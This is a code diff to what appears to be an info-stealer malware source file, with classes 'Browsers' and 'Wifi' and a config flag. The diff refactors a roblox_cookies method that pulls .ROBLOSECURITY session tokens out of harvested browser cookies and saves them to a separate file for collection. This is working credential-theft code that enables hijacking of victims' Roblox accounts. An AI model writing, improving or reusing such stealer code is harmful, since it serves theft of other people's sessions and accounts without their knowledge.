@@ -728,20 +728,20 @@ class Browsers:
         conn.close()
 
     def roblox_cookies(self):
+        robo_cookie_file = os.path.join(temp_path, "Browser", "roblox cookies.txt")
+
         if not __CONFIG__["roblox"]:
             pass
         else:
             robo_cookie = ""
             with open(os.path.join(temp_path, "Browser", "cookies.txt"), 'r', encoding="utf-8") as g:
-                with open(os.path.join(temp_path, "Browser", "roblox cookies.txt"), 'w', encoding="utf-8") as f:
-                    try:
-                        for line in g:
-                            if ".ROBLOSECURITY" in line:
-                                robo_cookie = line.split(".ROBLOSECURITY")[1].strip()
-                                f.write(robo_cookie + "\n")
-                    except Exception:
-                        robo_cookie = "No Roblox Cookies Found"
-
+                with open(robo_cookie_file, 'w', encoding="utf-8") as f:
+                    for line in g:
+                        if ".ROBLOSECURITY" in line:
+                            robo_cookie = line.split(".ROBLOSECURITY")[1].strip()
+                            f.write(robo_cookie + "\n\n")
+                    if os.path.getsize(robo_cookie_file) == 0:
+                        f.write("No Roblox Cookies Found")
 
 class Wifi:
     def __init__(self):
